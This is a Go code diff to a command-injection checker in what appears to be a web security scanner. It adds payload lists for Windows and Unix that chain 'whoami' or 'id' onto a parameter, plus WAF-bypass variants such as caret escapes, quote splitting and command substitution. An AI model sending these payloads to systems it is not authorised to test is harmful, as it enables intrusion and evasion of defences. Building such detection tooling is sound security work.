@@ -497,20 +497,58 @@ func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter strin
 		if isDirect {
 			// Direct command parameters - test without separator first
 			if strings.ToLower(c.platform) == "windows" {
-				payloads = []string{"whoami", "& whoami", "| whoami"}
-				payloadTypes = []PayloadType{PayloadTypeDirect, PayloadTypeChained, PayloadTypeChained}
+				payloads = []string{
+					"whoami",
+					"& whoami",
+					"| whoami",
+					// WAF bypass - URL encoding
+					"&%20whoami",
+					// WAF bypass - Caret escape
+					"& who^ami",
+					// WAF bypass - Explicit cmd
+					"& cmd /c whoami",
+				}
+				payloadTypes = []PayloadType{PayloadTypeDirect, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
 			} else {
-				payloads = []string{"id", "whoami", "; id", "| id"}
-				payloadTypes = []PayloadType{PayloadTypeDirect, PayloadTypeDirect, PayloadTypeChained, PayloadTypeChained}
+				payloads = []string{
+					"id",
+					"whoami",
+					"; id",
+					"| id",
+					// WAF bypass - URL encoding
+					";%20id",
+					// WAF bypass - Quote escape
+					"; wh''oami",
+					// WAF bypass - Command substitution
+					"; $(echo whoami)",
+				}
+				payloadTypes = []PayloadType{PayloadTypeDirect, PayloadTypeDirect, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
 			}
 		} else {
 			// Chained parameters (e.g., host for ping injection)
 			if strings.ToLower(c.platform) == "windows" {
-				payloads = []string{"& whoami", "| whoami", "&& whoami", "; whoami"}
-				payloadTypes = []PayloadType{PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
+				payloads = []string{
+					"& whoami",
+					"| whoami",
+					"&& whoami",
+					"; whoami",
+					// WAF bypass variants
+					"&%20whoami",
+					"& cmd /c whoami",
+				}
+				payloadTypes = []PayloadType{PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
 			} else {
-				payloads = []string{"; id", "| id", "&& id", "$(id)", "`id`"}
-				payloadTypes = []PayloadType{PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
+				payloads = []string{
+					"; id",
+					"| id",
+					"&& id",
+					"$(id)",
+					"`id`",
+					// WAF bypass variants
+					";%20id",
+					"; wh''oami",
+				}
+				payloadTypes = []PayloadType{PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained, PayloadTypeChained}
 			}
 		}
 
